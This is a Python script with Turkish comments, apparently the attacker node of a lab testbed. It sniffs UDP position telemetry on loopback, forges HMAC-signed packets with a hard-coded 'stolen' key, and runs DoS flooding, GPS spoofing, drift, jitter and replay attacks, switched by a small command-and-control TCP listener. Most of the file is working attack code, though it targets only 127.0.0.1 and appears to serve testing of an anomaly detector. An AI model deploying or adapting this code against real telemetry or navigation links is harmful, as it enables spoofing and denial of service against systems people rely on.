from scapy.all import sniff, UDP, IP, Raw
import socket
import struct
import threading
import time
import hmac
import hashlib
import random

#ag ayarlari
BPF_FILTER = "udp port 5005 and not src port 5055" #kendi gonderdigimiz sahte paketleri (5055 portundan cikan) dinlemeyi engelledik
IFACE = "lo"
TARGET_IP = "127.0.0.1"
TARGET_PORT = 5005 #makine2'nin dinledigi port
CMD_PORT = 5007 #makine4'ten (gui) gelecek saldiri komutlarininin dinlenecegi port 
COMPROMISED_KEY = b"finch_ebg_atreides" #calinmis anahtar 

current_attack_mode = "NORMAL" #NORMAL, DOS, SPOOF, DRIFT, JITTER, OUT_OF_ORDER
last_sniffed_payload = None    #araya girip degistirmek icin son yakalanan veri 

def parse_intercepted_packet(packet):
    global last_sniffed_payload
    if packet.haslayer(UDP) and packet.haslayer(Raw):
        raw_payload = packet[Raw].load
        if len(raw_payload) == 56:
            data_part = raw_payload[:24]
            try:
                unpacked = struct.unpack('!Idfff', data_part)
                last_sniffed_payload = {
                    "seq": unpacked[0], 
                    "ts":  unpacked[1],
                    "lat": unpacked[2], 
                    "lon": unpacked[3], 
                    "alt": unpacked[4]
                }
            except struct.error:
                pass

def sniffer_thread():
    print(f"[*] Sniffer aktif. '{IFACE}' uzerinde trafik izleniyor...")
    sniff(iface=IFACE, filter=BPF_FILTER, prn=parse_intercepted_packet, store=0)

def generate_signed_packet(seq, lat, lon, alt):
    payload = struct.pack('!Idfff', int(seq), time.time(), lat, lon, alt)
    signature = hmac.new(COMPROMISED_KEY, payload, hashlib.sha256).digest()
    return payload + signature

def attack_engine():
    global current_attack_mode, last_sniffed_payload
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    #saldiri paketleri buradan cikacak
    sock.bind(("0.0.0.0", 5055)) 
    
    drift_increment = 0.0 #drift saldiri icin artis miktari 
    
    while True:
        mode = current_attack_mode
        
        if mode == "NORMAL":
            time.sleep(0.5)
            continue
            
        elif mode == "DOS":
            #cok hizli sahte paket gonderimi
            garbage = generate_signed_packet(9999, 0, 0, 0)
            for _ in range(500): 
                sock.sendto(garbage, (TARGET_IP, TARGET_PORT))
            time.sleep(0.1) #ag tamamen kitlenmesin diye 
            
        elif mode == "SPOOF":
            #fiziksel imkansizlik (buyuk ve rastgele sicramalar) 
            if last_sniffed_payload:
                #15 ile 45 derece arasinda bir deger uret ve rastgele + ya da - yon ver 
                lat_jump = random.uniform(15.0, 45.0) * random.choice([-1, 1])
                lon_jump = random.uniform(15.0, 45.0) * random.choice([-1, 1])
                fake_alt = random.uniform(100.0, 900.0) #irtifa da rastgele sacmalanacak 
                
                fake_lat = last_sniffed_payload['lat'] + lat_jump
                fake_lon = last_sniffed_payload['lon'] + lon_jump
                
                pkt = generate_signed_packet(last_sniffed_payload['seq'] + 10, fake_lat, fake_lon, fake_alt)
                sock.sendto(pkt, (TARGET_IP, TARGET_PORT))
            time.sleep(1)
            
        elif mode == "DRIFT":
            #mikro-sapma: her saniye milimetrik ama rastgele degisen artis 
            if last_sniffed_payload:
                drift_increment += random.uniform(0.005, 0.020) 
                
                fake_lat = last_sniffed_payload['lat'] + drift_increment
                fake_lon = last_sniffed_payload['lon'] + (drift_increment * random.choice([-1, 1])) 
                
                pkt = generate_signed_packet(last_sniffed_payload['seq'] + 1, fake_lat, fake_lon, last_sniffed_payload['alt'])
                sock.sendto(pkt, (TARGET_IP, TARGET_PORT))
            time.sleep(1)
            
        elif mode == "JITTER":
            #gercek veriyi alir ama rastgele gecikmelerle yollar 
            if last_sniffed_payload:
                jitter_delay = random.uniform(0.2, 3.0)
                time.sleep(jitter_delay) 
              
                #biz beklerken makine1 yeni paketler yollar ve makine2'nin seq sayaci artar, paketin outoforder filtresinden gecebilmesi ve ysa'ya ulasabilmesi icin
                #seq numarasi bekledigimiz saniye ile orantili olarak ileri alindi
                fake_seq = last_sniffed_payload['seq'] + int(jitter_delay) + 2 
                
                pkt = generate_signed_packet(fake_seq, last_sniffed_payload['lat'], last_sniffed_payload['lon'], last_sniffed_payload['alt'])
                sock.sendto(pkt, (TARGET_IP, TARGET_PORT))
                
        elif mode == "OUT_OF_ORDER":
            #eski bir paketi veya sira numarasi atlamis paketi gonderir 
            if last_sniffed_payload:
                #sira no 0'in altina duserse programin cokmesi engellendi 
                fake_seq = max(0, last_sniffed_payload['seq'] - 5)
                pkt = generate_signed_packet(fake_seq, last_sniffed_payload['lat'], last_sniffed_payload['lon'], last_sniffed_payload['alt'])
                sock.sendto(pkt, (TARGET_IP, TARGET_PORT))
            time.sleep(1)

def command_listener():
    global current_attack_mode
    cmd_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cmd_sock.bind(("0.0.0.0", CMD_PORT))
    cmd_sock.listen(1)
    print(f"[*] C&C Komuta Merkezi Dinleniyor... (Port: {CMD_PORT})")
    
    while True:
        try:
            conn, addr = cmd_sock.accept()
            data = conn.recv(1024).decode().strip()
            if data in ["NORMAL", "DOS", "SPOOF", "DRIFT", "JITTER", "OUT_OF_ORDER"]:
                current_attack_mode = data
                print(f"\n[!!!] EMIR ALINDI! Sistem Modu Degistirildi -> {current_attack_mode}")
            conn.close()
        except Exception as e:
            print(f"[-] Komuta Dinleme Hatasi: {e}")

if __name__ == "__main__":
    print("="*50)
    print(" MAKINE 3: GELISMIS SALDIRI VE KOMUTA KONTROL MERKEZI")
    print("="*50)
    
    #1.thread sniffer_thread fonksiyonunu baslatacak, sniffer aktif
    threading.Thread(target=sniffer_thread, daemon=True).start()
    
    #2.thread attack_engine fonksiyonunu baslatacak 
    threading.Thread(target=attack_engine, daemon=True).start()
    
    #main thread komuta kontrol (c&c) sunucusunu (makine4) dinler 
    command_listener()